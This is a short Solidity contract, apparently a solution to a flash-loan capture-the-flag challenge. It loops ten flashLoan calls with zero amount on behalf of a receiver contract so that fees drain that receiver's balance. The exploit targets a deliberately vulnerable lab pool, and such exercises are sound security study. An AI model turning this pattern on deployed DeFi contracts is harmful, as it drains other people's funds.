// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

/**
    Contract to call 10 times flashloan(...) function in a single transaction
 */
contract NaiveAttacker {

    function callFlashLoan(NaiveReceiverLenderPool _poolContract, address _receiverContract) external {
        for(uint i ; i < 10 ; i++){
            _poolContract.flashLoan(_receiverContract,0);
        }
    }
}